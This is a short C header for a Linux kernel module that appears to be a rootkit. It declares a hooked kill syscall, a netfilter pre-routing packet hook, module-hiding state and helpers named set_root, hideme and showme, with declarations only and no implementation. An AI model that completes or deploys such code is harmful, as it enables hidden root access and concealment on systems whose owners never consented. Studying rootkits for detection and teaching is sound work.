#include "ftrace_hook.h"

#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/string.h>


// variables for module hiding
struct list_head *prev_module;
short hidden = 1;


// hooked syscalls
asmlinkage long (*orig_kill)(const struct pt_regs *);
// asmlinkage long (*orig_delete_module)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs);
// asmlinkage int hook_delete_module(const struct pt_regs *regs);


// netfilter hook
unsigned int my_nf_hookfn(void *priv,
              struct sk_buff *skb,
              const struct nf_hook_state *state);

struct nf_hook_ops my_nfho = {
      .hook        = my_nf_hookfn,
      .hooknum     = NF_INET_PRE_ROUTING,
      .pf          = PF_INET,
      .priority    = NF_IP_PRI_FIRST
};


// helper functions
void set_root(void);
void showme(void);
void hideme(void);